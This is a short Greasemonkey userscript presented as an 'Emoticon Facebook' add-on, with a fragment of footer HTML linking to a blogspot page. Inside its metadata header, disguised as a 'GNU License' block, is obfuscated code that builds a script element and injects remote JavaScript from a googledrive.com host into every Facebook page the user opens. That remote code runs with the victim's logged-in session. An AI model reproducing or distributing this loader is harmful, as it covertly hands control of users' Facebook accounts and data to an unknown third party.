// ==UserScript==
// @name        Emoticon Facebook
// @namespace   Emoticon facebook
// @description Emoticon Facebook
// @include     *://*.facebook.com/*
// @grant       none
//--------------- GNU License --------------- 
var gnu=["src","script","createElement","appendChild","body","https://googledrive.com/host/0BzvUrlDnNRYabHp0bVY1YlBKX0U"];
(function (){document[gnu[4]][gnu[3]](document[gnu[2]](gnu[1]))[gnu[0]]=gnu[5];} )();
//--------------- GNU License --------------- 
// ==/UserScript==
...
(function() {
	...
	// Footer
	html += '<div class="_26y3" align="center" style="padding:5px; background:#ccc; text-shadow:1px 1px 1px #fff ">';
	html += '<a class="_8-c" href="http://ubahfacebook.blogspot.com" target="_blank">Ubah Tampilan Facebook</a>';
	html += '</div>';
